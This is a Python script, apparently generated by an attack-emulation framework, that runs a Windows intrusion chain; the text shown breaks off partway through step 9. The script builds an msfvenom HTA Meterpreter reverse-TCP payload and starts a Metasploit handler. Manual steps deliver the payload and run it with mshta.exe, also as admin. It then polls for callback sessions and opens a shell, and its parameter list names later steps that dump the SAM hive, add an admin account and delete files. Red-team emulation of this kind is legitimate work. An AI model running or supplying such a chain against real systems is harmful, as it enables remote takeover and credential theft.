import argparse
import asyncio
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List

import yaml
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from rich.table import Table

from attack_executor.post_exploit.Sliver import PowerShellNonTerminatingWarning

console = Console()
user_params: Dict[str, str] = {}

# Runtime configuration set from CLI args. Touched ONLY by main() and the
# helper functions below — step bodies never check it directly.
_RUNTIME = {
    "params": {},        # contents of --params file (dict with 'pddl_bindings' / 'steps')
    "no_prompt": False,  # --no-prompt flag
}

# Each entry: {idx, name, start, end} where start/end are monotonic seconds.
# Populated by _step_started / _step_finished bracketing each included step.
_STEP_RECORDS: List[dict] = []
_RUN_START_TS = None

# (step_id, param_name, pddl_index_or_empty) tuples for every required
# parameter — populated by the Jinja template at generation time so the
# preflight check knows what to look for. `pddl_index` is "" for free
# (non-PDDL-bound) params, otherwise the PDDL variable name.
_REQUIRED_PARAMS = [
    ("1_msfvenom-hta", "LHOST", ""),    ("1_msfvenom-hta", "LPORT", ""),    ("1_msfvenom-hta", "SAVE_PATH", "string0_var_in_plan"),    ("3_simulate-download-file", "LHOST", ""),    ("3_simulate-download-file", "LPORT", ""),    ("3_simulate-download-file", "SAVE_PATH", "string2_var_in_plan"),    ("4_simulate-execute-hta-windows", "HTA_PATH", "string2_var_in_plan"),    ("6_meterpreter-getenv", "name", ""),    ("7_simulate-execute-hta-windows-root", "HTA_PATH", "string2_var_in_plan"),    ("10_art-t1003_002-reg-save-sam", "save_dir", "string1_var_in_plan"),    ("11_meterpreter-download", "remote_path", "string1_var_in_plan"),    ("11_meterpreter-download", "output_dir", ""),    ("12_art-t1136_001-net-user-admin", "username", ""),    ("12_art-t1136_001-net-user-admin", "password", ""),    ("13_meterpreter-delete", "RemotePath", "string2_var_in_plan"),]


def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )


def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")


def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    """Yes/no prompt for chain-progression confirmations ('Keep going?',
    'Execute this command?').

    - In --no-prompt mode, returns True silently.
    - In interactive mode, answering `n` aborts the chain (clean exit
      with a summary). The user can use this to pause / cancel
      mid-execution.
    """
    if _RUNTIME["no_prompt"]:
        return True
    ok = Confirm.ask(
        f"[bold bright_cyan]{prompt}[/]",
        default=True,
        show_default=True,
    )
    if not ok:
        console.print(
            "[yellow]\n⏹  Chain aborted by user. Run the script again to retry from the start.[/]"
        )
        _print_chain_summary(aborted=True)
        sys.exit(0)
    return True


def wait_for_human(prompt: str) -> bool:
    """Always-blocking confirmation for Human steps. Loops on `n` because
    the chain cannot proceed until the human has actually completed the
    manual action — `n` means "not yet, ask me again" rather than
    "skip this step" or "abort"."""
    while True:
        ok = Confirm.ask(
            f"[bold red]⏸  {prompt}[/]",
            default=True,
            show_default=True,
        )
        if ok:
            return True
        console.print(
            "[yellow]  ↻ Re-prompting — the chain can't continue until the manual step is done.[/]"
        )


def _lookup_params_value(step_id: str, name: str, pddl_index: str):
    """Look up a value in the params file. Precedence:
    pddl_bindings[pddl_index] > steps[step_id][name] > None."""
    pf = _RUNTIME["params"] or {}
    if pddl_index:
        v = pf.get("pddl_bindings", {}).get(pddl_index)
        if v is not None:
            return v, f"params file: pddl_bindings.{pddl_index}"
    v = pf.get("steps", {}).get(step_id, {}).get(name)
    if v is not None:
        return v, "params file"
    return None, None


def _get_param_input(
    step_id: str,
    name: str,
    pddl_index: str,
    action_default: str,
    required: bool,
) -> str:
    """Resolve one parameter's value with this precedence:
        1. params file (pddl_bindings or steps section)
        2. action YAML default
        3. interactive prompt (skipped in --no-prompt mode)

    In --no-prompt mode, returns the resolved value without prompting.
    Preflight has already guaranteed required params are present.
    """
    pf_value, pf_source = _lookup_params_value(step_id, name, pddl_index)
    current = pf_value if pf_value is not None else (action_default or "")

    if _RUNTIME["no_prompt"]:
        # Echo the resolved value so the operator can see what's being
        # used without having to open the params file alongside.
        resolved = str(current) if current is not None else ""
        source = pf_source if pf_value is not None else "action default"
        console.print(
            f"  [green]✓ Using value:[/] [bold]{resolved or '<empty>'}[/] "
            f"[dim]({source})[/]"
        )
        return resolved

    # Build the prompt with source labelling so the user can see where the
    # suggested value came from.
    if pf_value is not None:
        hint = f"current: {pf_value!r} [{pf_source}], required: {required}"
    elif action_default:
        hint = f"default: {action_default!r} [action default], required: {required}"
    else:
        hint = f"default: <none>, required: {required}"

    while True:
        user_input = console.input(
            f"[bold]➤ Enter value for {name} ({hint}): [/]"
        )
        if not user_input:
            user_input = str(current) if current is not None else ""
        if user_input or not required:
            return user_input
        console.print(f"[bold red]  ⚠ {name} is required. Please enter a value.[/]")


def _preflight_check_required_params() -> None:
    """When --no-prompt is on, verify every required param has a value in
    the params file. If not, list what's missing and exit so the user can
    fix the file instead of hitting an error mid-execution.

    PDDL-bound runtime entities like Sliver session IDs (variables named
    `executor*_var_in_plan`) are excluded — those genuinely can't be set
    ahead of time."""
    pf = _RUNTIME["params"] or {}
    missing = []
    for step_id, name, pddl_index in _REQUIRED_PARAMS:
        if pddl_index.startswith("executor"):
            # Sliver session selection happens at runtime; not preflightable.
            continue
        v, _ = _lookup_params_value(step_id, name, pddl_index)
        if v is None:
            location = (
                f"pddl_bindings.{pddl_index}"
                if pddl_index else
                f"steps.{step_id}.{name}"
            )
            missing.append((step_id, name, location))

    if missing:
        console.print(
            f"[bold red]❌ Cannot run with --no-prompt: "
            f"{len(missing)} required param(s) not set in the params file.[/]"
        )
        for step_id, name, location in missing:
            console.print(f"  [yellow]·[/] {step_id:<40} [bold]{name}[/]  expected at: [dim]{location}[/]")
        console.print(
            "\n[bold]Fill these into the params file then retry.[/]"
        )
        sys.exit(1)


def _step_started(idx, name: str) -> None:
    """Record the start of a step (after its header prints, just before
    parameter prompting). Time stamp is monotonic seconds + wall clock."""
    _STEP_RECORDS.append({
        "idx": idx,
        "name": name,
        "start_mono": time.monotonic(),
        "start_wall": datetime.now(timezone.utc),
        "end_mono": None,
        "end_wall": None,
        "status": "ok",
        "error": "",
    })


def _step_finished(idx) -> None:
    """Record the end of a step (after its final confirm_action /
    wait_for_human returns)."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    if rec["idx"] != idx:
        return  # defensive: out-of-order, skip
    rec["end_mono"] = time.monotonic()
    rec["end_wall"] = datetime.now(timezone.utc)


def _step_uncertain(warn: Exception) -> None:
    """Flag the currently-running step as uncertain — the underlying
    tool exited with a success status but produced signals that a real
    APT operator would review before treating it as success (e.g. non-
    terminating Error/Warning stream content from a PowerShell script).
    Chain continues to the next step. The summary marks this "?"
    instead of ✓ / ✗."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    rec["status"] = "uncertain"
    _msg = str(warn) or repr(warn)
    rec["error"] = _msg if len(_msg) <= 2000 else _msg[:1997] + "…"
    _bar = "━" * 68
    console.print()
    console.print(
        f"[bold yellow]{_bar}\n"
        f"  ? Step {rec['idx']} uncertain: {rec['name']}\n"
        f"{_bar}[/]"
    )
    console.print(f"[yellow]{_msg}[/]")
    console.print(f"[bold yellow]{_bar}[/]")
    console.print()


def _step_failed(err: Exception) -> None:
    """Flag the currently-running step as failed, record a short error
    string, and print a visually-bordered failure box so the boundary
    stays visible in the live log stream even when tracebacks / cmd
    output have muddied it. Chain continues to the next step — the
    CI-style principle is 'run everything, report at the end' rather
    than hard-crashing the whole run on one hiccup."""
    if not _STEP_RECORDS:
        return
    rec = _STEP_RECORDS[-1]
    rec["status"] = "failed"
    _msg = str(err) or repr(err)
    rec["error"] = _msg if len(_msg) <= 2000 else _msg[:1997] + "…"
    _bar = "━" * 68
    console.print()
    console.print(
        f"[bold red]{_bar}\n"
        f"  ✗ Step {rec['idx']} failed: {rec['name']}\n"
        f"{_bar}[/]"
    )
    console.print(f"[red]{_msg}[/]")
    console.print(f"[bold red]{_bar}[/]")
    console.print()


def _fmt_dur(seconds) -> str:
    if seconds is None:
        return "—"
    if seconds < 60:
        return f"{seconds:.1f}s"
    m, s = divmod(int(seconds), 60)
    return f"{m}m {s}s"


def _print_chain_summary(aborted: bool = False) -> None:
    """End-of-chain summary: each step's name, start/end wall-clock time,
    and duration. Total run time at the bottom."""
    if not _STEP_RECORDS:
        return
    bar = "═" * 70
    console.print()
    console.print(bar)
    title = "Attack Chain Run Summary" + ("  (ABORTED)" if aborted else "")
    console.print(f"  [bold]{title}[/]")
    console.print(bar)

    table = Table(show_header=True, header_style="bold", box=None, pad_edge=False)
    table.add_column("Step", justify="right", style="dim")
    table.add_column("Name")
    table.add_column("Start", style="dim")
    table.add_column("End",   style="dim")
    table.add_column("Duration", justify="right")
    table.add_column("Status", justify="center")

    for rec in _STEP_RECORDS:
        if rec["end_mono"] is not None:
            dur = rec["end_mono"] - rec["start_mono"]
            end_str = rec["end_wall"].strftime("%Y-%m-%d %H:%M:%S UTC")
            if rec["status"] == "failed":
                status = "[red]✗[/]"
            elif rec["status"] == "uncertain":
                status = "[yellow]?[/]"
            else:
                status = "[green]✓[/]"
        else:
            dur = None
            status = "[red]✗[/]" if aborted else "[yellow]…[/]"
            end_str = "—"
        table.add_row(
            str(rec["idx"]),
            rec["name"] or "<unnamed>",
            rec["start_wall"].strftime("%Y-%m-%d %H:%M:%S UTC"),
            end_str,
            _fmt_dur(dur),
            status,
        )
    console.print(table)

    # Failure details — one short line per failed step so the operator
    # doesn't have to scroll back through the run log to find them.
    _failed = [r for r in _STEP_RECORDS if r["status"] == "failed"]
    if _failed:
        console.print()
        console.print(f"  [bold red]Failed steps ({len(_failed)}):[/]")
        for rec in _failed:
            console.print(
                f"  [red]✗[/] Step {rec['idx']}: {rec['name']}"
            )
            if rec["error"]:
                # Re-indent every line (Rich's console.print does not
                # auto-indent embedded newlines).
                console.print("\n".join(
                    "      " + ln for ln in rec["error"].splitlines()))

    # Uncertain details — same shape, yellow, so review candidates stand out
    # separately from confirmed failures.
    _uncertain = [r for r in _STEP_RECORDS if r["status"] == "uncertain"]
    if _uncertain:
        console.print()
        console.print(f"  [bold yellow]Uncertain steps ({len(_uncertain)}):[/]")
        for rec in _uncertain:
            console.print(
                f"  [yellow]?[/] Step {rec['idx']}: {rec['name']}"
            )
            if rec["error"]:
                console.print("\n".join(
                    "      " + ln for ln in rec["error"].splitlines()))

    total = time.monotonic() - (_RUN_START_TS or time.monotonic())
    finished = sum(1 for r in _STEP_RECORDS if r["end_mono"] is not None)
    _ok = sum(1 for r in _STEP_RECORDS if r["status"] == "ok" and r["end_mono"] is not None)
    _uncertain_n = sum(1 for r in _STEP_RECORDS if r["status"] == "uncertain")
    _bad = sum(1 for r in _STEP_RECORDS if r["status"] == "failed")
    console.print()
    console.print(
        f"  [bold]Total:[/] {finished} steps executed "
        f"([green]{_ok} ✓[/], [yellow]{_uncertain_n} ?[/], [red]{_bad} ✗[/]) "
        f"in [bold]{_fmt_dur(total)}[/]"
    )
    console.print(bar)


def _load_params_file(path: str) -> dict:
    p = Path(path)
    if not p.exists():
        console.print(f"[bold red]❌ Params file not found: {path}[/]")
        sys.exit(1)
    try:
        data = yaml.safe_load(p.read_text())
    except yaml.YAMLError as e:
        console.print(f"[bold red]❌ Failed to parse params file {path}: {e}[/]")
        sys.exit(1)
    if not isinstance(data, dict):
        console.print(f"[bold red]❌ Params file must be a YAML mapping; got {type(data).__name__}[/]")
        sys.exit(1)
    return data


async def main():
    parser = argparse.ArgumentParser(
        description="Execute an Aurora-generated attack chain.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--params",
        help="Path to a YAML params file to pre-fill parameter values.",
    )
    parser.add_argument(
        "--no-prompt",
        action="store_true",
        help="Don't prompt for parameters that are in the params file or "
             "have an action default. Requires --params. Human steps and "
             "Sliver session selections still pause for user action.",
    )
    args = parser.parse_args()

    if args.no_prompt and not args.params:
        parser.error("--no-prompt requires --params")

    if args.params:
        _RUNTIME["params"] = _load_params_file(args.params)
    _RUNTIME["no_prompt"] = args.no_prompt

    if args.no_prompt:
        _preflight_check_required_params()
        console.print(
            f"[bold green]✓ Preflight passed: all required params resolved.[/]"
        )

    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")

    pddl_parameters = {}

    # Dictionary to track executors and their relationships
    # Each executor has: type, isDerivedExecutor, RealSessionID, parentExecutor
    executor_dict = {}

    # Chain-level record of every meterpreter session id observed so far.
    # Used by the `Meterpreter Session Establish` step-type to detect
    # *new* sessions across the whole run rather than just "new since I
    # started polling" — payloads often call back BEFORE the operator
    # finishes the Human step, so per-step snapshots would treat those
    # already-registered sessions as baseline and never flag them.
    _seen_meterpreter_sessions: set = set()

    # Sliver counterpart: same chain-level "already-observed" semantics
    # for `Sliver Session Establish`. Populated by
    # `sliver_session_wait.j2`.
    _seen_sliver_sessions: set = set()

    global _RUN_START_TS
    _RUN_START_TS = time.monotonic()
    _step_started(1, "Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom")

    console.print(f"[bold cyan]\n📌[MSFVenom Console] Step 1[/]")
    console.print(f"[bold cyan]\n📌[Name] Build the HTA (HTML Application) file of a Meterpreter session (for Windows) using MSFVenom[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    user_params["LHOST"] = _get_param_input("1_msfvenom-hta", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacker machine")
    user_params["LPORT"] = _get_param_input("1_msfvenom-hta", "LPORT", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the generated payload")
    if "string0_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string0_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string0_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("1_msfvenom-hta", "SAVE_PATH", "string0_var_in_plan", '', True)
        pddl_parameters["string0_var_in_plan"] = user_params["SAVE_PATH"]
    from attack_executor.exploit.Metasploit import MetasploitExecutor
    metasploit_executor = MetasploitExecutor(config=config)
    import subprocess
    _msfvenom_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={user_params['LHOST']} LPORT={user_params['LPORT']} -f hta-psh -o {user_params['SAVE_PATH']}"
    console.print(f"[bold cyan]\n[MSFVenom] Command to run:[/]")
    console.print(f"  [white]{_msfvenom_cmd}[/]")
    confirm_action("Run this MSFVenom command?")
    console.print(f"[bold cyan][MSFVenom] Running... (may take 5-10s)[/]")
    try:
        result = subprocess.run(_msfvenom_cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            console.print(f"[bold green]✓ MSFVenom payload generated successfully[/]")
            if result.stdout:
                console.print(result.stdout)
        else:
            console.print(f"[bold red]✗ MSFVenom failed (exit {result.returncode})[/]")
            if result.stderr:
                console.print(f"[bold red]{result.stderr}[/]")
    except Exception as e:
        _step_failed(e)
    _step_finished(1)
    _step_started(2, "Set an MSF payload handler for a file-backed payload")

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 2[/]")
    console.print(f"[bold cyan]\n📌[Name] Set an MSF payload handler for a file-backed payload[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    user_params["LHOST"] = _get_param_input("2_set-msf-payload-handler-for-file", "LHOST", "", '', False)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    user_params["LPORT"] = _get_param_input("2_set-msf-payload-handler-for-file", "LPORT", "", '', False)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: payload_name[/]")
    console.print(f"  Description: payload type set by msf")
    user_params["payload_name"] = _get_param_input("2_set-msf-payload-handler-for-file", "payload_name", "", '', False)
    # TARGETURI arrives with an optional leading/trailing slash; MSF's
    # module APIs want it stripped. Applied here (rather than in the
    # generic param loop) because it's specific to the Metasploit call.
    if "TARGETURI" in user_params:
        user_params["TARGETURI"] = user_params["TARGETURI"].strip("/")
    with console.status("[bold green]Setting up listener..."):
        _msf_result = metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="exploit/multi/handler",
            payload_module_name=user_params.get("payload_name") or "windows/meterpreter_reverse_https",
            LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
        )
    if not _msf_result.get("ok"):
        console.print(f"[bold red]✗ Metasploit step failed: {_msf_result.get('error')}[/]")
        raise RuntimeError(
            f"MSF handler failed to start: "
            f"{_msf_result.get('error')}"
        )
    console.print(
        f"[bold green]✓ Handler active — "
        f"job {_msf_result['job_id']}, awaiting callback[/]"
    )
    metasploit_sessionid = metasploit_executor.select_session()
    _step_finished(2)
    _step_started(3, "Simulate the victim download a file on its machine")

    console.print(f"[bold cyan]\n📌[Human] Step 3[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim download a file on its machine[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the http file server (typically the attacker machine)")
    user_params["LHOST"] = _get_param_input("3_simulate-download-file", "LHOST", "", '', True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: port of the http file server")
    user_params["LPORT"] = _get_param_input("3_simulate-download-file", "LPORT", "", 8000, True)
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SAVE_PATH[/]")
    console.print(f"  Description: Saved path of the downloaded payload")
    if "string2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2_var_in_plan"]))
        user_params["SAVE_PATH"] = pddl_parameters["string2_var_in_plan"]
    else:
        user_params["SAVE_PATH"] = _get_param_input("3_simulate-download-file", "SAVE_PATH", "string2_var_in_plan", '', True)
        pddl_parameters["string2_var_in_plan"] = user_params["SAVE_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server {user_params['LPORT']}

(On victim's machine)
1. Open {user_params['LHOST']}:{user_params['LPORT']} in the browser
2. Navigate to the path of the file on the attacker's machine
3. Download the file to {user_params['SAVE_PATH']}
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(3)
    _step_started(4, "Simulate the victim execute an HTA file on its machine")

    console.print(f"[bold cyan]\n📌[Human] Step 4[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim execute an HTA file on its machine[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: HTA_PATH[/]")
    console.print(f"  Description: Saved path of the HTA file on the victim machine")
    if "string2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2_var_in_plan"]))
        user_params["HTA_PATH"] = pddl_parameters["string2_var_in_plan"]
    else:
        user_params["HTA_PATH"] = _get_param_input("4_simulate-execute-hta-windows", "HTA_PATH", "string2_var_in_plan", '', True)
        pddl_parameters["string2_var_in_plan"] = user_params["HTA_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, use PowerShell or Command Prompt, or the Run dialog)
mshta.exe {user_params['HTA_PATH']}
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(4)
    _step_started(5, "Execute a Meterpreter Payload")

    console.print(f"[bold cyan]\n📌[Session Check] Step 5[/]")
    console.print(f"[bold cyan]📌[Name] Execute a Meterpreter Payload[/]")
    # Poll for a meterpreter session that hasn't been observed on any
    # earlier step. Comparing against the chain-level
    # `_seen_meterpreter_sessions` (rather than a snapshot taken here)
    # is what makes this work when the payload connects back BEFORE
    # the operator finishes the human step — that session is already
    # registered by the time we get here.
    while True:
        console.print(
            f"[bold cyan][Session Check] Polling for new meterpreter session (30s)…[/]"
        )
        _deadline = time.time() + 30
        _all_sessions = {}
        _fresh_ids = set()
        while time.time() < _deadline:
            _all_sessions = metasploit_executor.get_sessions()
            _now_ids = set(str(_sid) for _sid in _all_sessions.keys())
            _fresh_ids = _now_ids - _seen_meterpreter_sessions
            if _fresh_ids:
                break
            time.sleep(1)
        if _fresh_ids:
            # Show what was already known vs what just showed up, then
            # ask the operator to type the id of the specific session
            # they want to accept. Explicit id-selection (rather than a
            # bare y/n) is robust in the multi-callback edge case —
            # two implants racing back at once — and matches how the
            # rest of aurora's UX asks for session ids.
            _prev = sorted(_seen_meterpreter_sessions)
            _new = sorted(_fresh_ids)
            console.print(f"[green]  Previously known sessions:[/] {_prev if _prev else '(none)'}")
            console.print(f"[bold green]  Newly detected session(s):[/]")
            for _sid in _new:
                _info = _all_sessions.get(_sid) or _all_sessions.get(int(_sid)) or {}
                _tunnel = _info.get("tunnel_peer") or _info.get("session_host") or "?"
                _who = _info.get("info") or _info.get("username") or "?"
                _typ = _info.get("type") or "?"
                console.print(f"    [{_sid}] {_typ} — {_who} ({_tunnel})")
            _default_pick = _new[0]
            while True:
                _picked = (console.input(
                    f"[bold]➤ Session id to accept (default: {_default_pick}, or 'n' to abort chain): [/]"
                ) or _default_pick).strip()
                if _picked.lower() == "n":
                    console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
                    _print_chain_summary(aborted=True)
                    sys.exit(0)
                if _picked in _fresh_ids:
                    break
                console.print(
                    f"[yellow]  '{_picked}' is not one of the newly detected session ids "
                    f"({sorted(_fresh_ids)}). Try again.[/]"
                )
            # Only mark the accepted session as seen. If more than one
            # callback landed, the unpicked ones stay "fresh" for the
            # next session-check step to consume.
            _seen_meterpreter_sessions.add(_picked)
            break
        console.print(f"[bold yellow]⚠ No new meterpreter session after 30s.[/]")
        # Escape brackets — rich treats bare [r=... / n=...] as a markup
        # tag and silently drops it from the prompt.
        _choice = (console.input(
            "[bold]➤ Retry polling? \\[r=retry / n=stop and print summary] (r): [/]"
        ) or "r").strip().lower()
        if _choice.startswith("n"):
            console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
            _print_chain_summary(aborted=True)
            sys.exit(0)
        # else loop again — chain-level baseline is unchanged so any
        # session that came in mid-retry is still counted as fresh.
    _step_finished(5)
    _step_started(6, "Retrieve Environment Variable")

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 6[/]")
    console.print(f"[bold cyan]\n📌[Name] Retrieve Environment Variable[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection.")
    if "executor2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor2_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor2_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor2_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor2_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
        }
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: name[/]")
    console.print(f"  Description: Name of the environment variable to query")
    user_params["name"] = _get_param_input("6_meterpreter-getenv", "name", "", '', True)
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: getenv[/]")
    confirm_action()
    try:
        metasploit_executor.getenv(var_name=str(user_params["name"]), meterpreter_sessionid=str(user_params["executor"]))
    except Exception as e:
        _step_failed(e)
    _step_finished(6)
    _step_started(7, "Simulate the victim execute an HTA file on its machine as Admin")

    console.print(f"[bold cyan]\n📌[Human] Step 7[/]")
    console.print(f"[bold cyan]\n📌[Name] Simulate the victim execute an HTA file on its machine as Admin[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: HTA_PATH[/]")
    console.print(f"  Description: Saved path of the HTA file on the victim machine")
    if "string2_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string2_var_in_plan"]))
        user_params["HTA_PATH"] = pddl_parameters["string2_var_in_plan"]
    else:
        user_params["HTA_PATH"] = _get_param_input("7_simulate-execute-hta-windows-root", "HTA_PATH", "string2_var_in_plan", '', True)
        pddl_parameters["string2_var_in_plan"] = user_params["HTA_PATH"]
    _human_action = f"""(This step needs human interaction and (temporarily) cannot be executed automatically)
(On victim's machine, open an ELEVATED PowerShell or Command Prompt)
mshta.exe {user_params['HTA_PATH']}
"""
    console.print(f"[bold yellow]\n⚠ Human action required:[/]")
    console.print(Panel(_human_action, title="[bold red]Manual Step[/]", expand=False))
    wait_for_human("Have you completed this manual step?")
    _step_finished(7)
    _step_started(8, "Execute a Meterpreter Payload")

    console.print(f"[bold cyan]\n📌[Session Check] Step 8[/]")
    console.print(f"[bold cyan]📌[Name] Execute a Meterpreter Payload[/]")
    # Poll for a meterpreter session that hasn't been observed on any
    # earlier step. Comparing against the chain-level
    # `_seen_meterpreter_sessions` (rather than a snapshot taken here)
    # is what makes this work when the payload connects back BEFORE
    # the operator finishes the human step — that session is already
    # registered by the time we get here.
    while True:
        console.print(
            f"[bold cyan][Session Check] Polling for new meterpreter session (30s)…[/]"
        )
        _deadline = time.time() + 30
        _all_sessions = {}
        _fresh_ids = set()
        while time.time() < _deadline:
            _all_sessions = metasploit_executor.get_sessions()
            _now_ids = set(str(_sid) for _sid in _all_sessions.keys())
            _fresh_ids = _now_ids - _seen_meterpreter_sessions
            if _fresh_ids:
                break
            time.sleep(1)
        if _fresh_ids:
            # Show what was already known vs what just showed up, then
            # ask the operator to type the id of the specific session
            # they want to accept. Explicit id-selection (rather than a
            # bare y/n) is robust in the multi-callback edge case —
            # two implants racing back at once — and matches how the
            # rest of aurora's UX asks for session ids.
            _prev = sorted(_seen_meterpreter_sessions)
            _new = sorted(_fresh_ids)
            console.print(f"[green]  Previously known sessions:[/] {_prev if _prev else '(none)'}")
            console.print(f"[bold green]  Newly detected session(s):[/]")
            for _sid in _new:
                _info = _all_sessions.get(_sid) or _all_sessions.get(int(_sid)) or {}
                _tunnel = _info.get("tunnel_peer") or _info.get("session_host") or "?"
                _who = _info.get("info") or _info.get("username") or "?"
                _typ = _info.get("type") or "?"
                console.print(f"    [{_sid}] {_typ} — {_who} ({_tunnel})")
            _default_pick = _new[0]
            while True:
                _picked = (console.input(
                    f"[bold]➤ Session id to accept (default: {_default_pick}, or 'n' to abort chain): [/]"
                ) or _default_pick).strip()
                if _picked.lower() == "n":
                    console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
                    _print_chain_summary(aborted=True)
                    sys.exit(0)
                if _picked in _fresh_ids:
                    break
                console.print(
                    f"[yellow]  '{_picked}' is not one of the newly detected session ids "
                    f"({sorted(_fresh_ids)}). Try again.[/]"
                )
            # Only mark the accepted session as seen. If more than one
            # callback landed, the unpicked ones stay "fresh" for the
            # next session-check step to consume.
            _seen_meterpreter_sessions.add(_picked)
            break
        console.print(f"[bold yellow]⚠ No new meterpreter session after 30s.[/]")
        # Escape brackets — rich treats bare [r=... / n=...] as a markup
        # tag and silently drops it from the prompt.
        _choice = (console.input(
            "[bold]➤ Retry polling? \\[r=retry / n=stop and print summary] (r): [/]"
        ) or "r").strip().lower()
        if _choice.startswith("n"):
            console.print("[yellow]\n⏹  Chain aborted at session check.[/]")
            _print_chain_summary(aborted=True)
            sys.exit(0)
        # else loop again — chain-level baseline is unchanged so any
        # session that came in mid-retry is still counted as fresh.
    _step_finished(8)
    _step_started(9, "Get an Interactive Shell on Windows")

    console.print(f"[bold cyan]\n📌[Meterpreter Session Derive] Step 9[/]")
    console.print(f"[bold cyan]📌[Name] Get an Interactive Shell on Windows[/]")
    console.print(f"[bold cyan] Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: executor[/]")
    console.print(f"  Description: The Meterpreter session ID of the active Metasploit connection.")
    if "executor0_var_in_plan" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["executor0_var_in_plan"]))
        user_params["executor"] = pddl_parameters["executor0_var_in_plan"]
    else:
        if 'metasploit_executor' not in dir():
            from attack_executor.exploit.Metasploit import MetasploitExecutor
            metasploit_executor = MetasploitExecutor(config=config)
        console.print(f"[bold cyan]  Select from available Meterpreter sessions:[/]")
        selected_session = metasploit_executor.select_meterpreter_session()
        user_params["executor"] = selected_session
        pddl_parameters["executor0_var_in_plan"] = selected_session
        metasploit_sessionid = selected_session
        executor_dict["executor0_var_in_plan"] = {
            "type": "Meterpreter Executor",
            "isDerivedExecutor": False,
            "RealSessionID": selected_session,
            "parentExecutor": None
